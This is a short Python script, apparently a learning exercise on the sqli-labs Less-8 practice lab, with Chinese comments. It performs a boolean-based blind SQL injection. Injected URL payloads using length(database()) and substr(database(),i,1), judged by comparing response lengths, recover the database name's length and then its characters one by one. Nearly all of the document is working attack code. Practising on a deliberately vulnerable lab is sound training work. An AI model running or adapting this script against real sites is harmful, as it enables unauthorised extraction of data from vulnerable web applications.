import requests

import string


urldef = "http://10.0.2.15/sqli-labs/Less-8/index.php/"

 
textLen = len(requests.get(url=urldef+"?id=1").text)

print (textLen)  # 原始 URL输入时，对应的输出值 

dbNamelen = 0
while True:

     InjectUrl = urldef+"?id=1'+and+length(database())=" + str(dbNamelen)+"--+"
     #print (len(requests.get(InjectUrl).text))
     print (InjectUrl)  

     if len(requests.get(InjectUrl).text) == textLen:
         print (dbNamelen)
         # 打印出输入URL 
         break
     if dbNamelen == 9:
         print ("Error! 数据库名称长度大于10 ")
         break
    
     dbNamelen +=1

dbName = ""
# 数据库长度,由上一个程序可得, 是 8 位, 所有 i 的取值 范围 为  1，到 9  即可 。
for i in range(1,9):
     #print (i)
     for a in string.ascii_lowercase:
          #print(a)
          dbName_url = urldef+"?id=1'+and+substr(database(),"+str(i)+",1)='"+a+"'--+"
          print (dbName_url)
          if len(requests.get(dbName_url).text) == textLen:
              dbName += a
              print (dbName)
              break
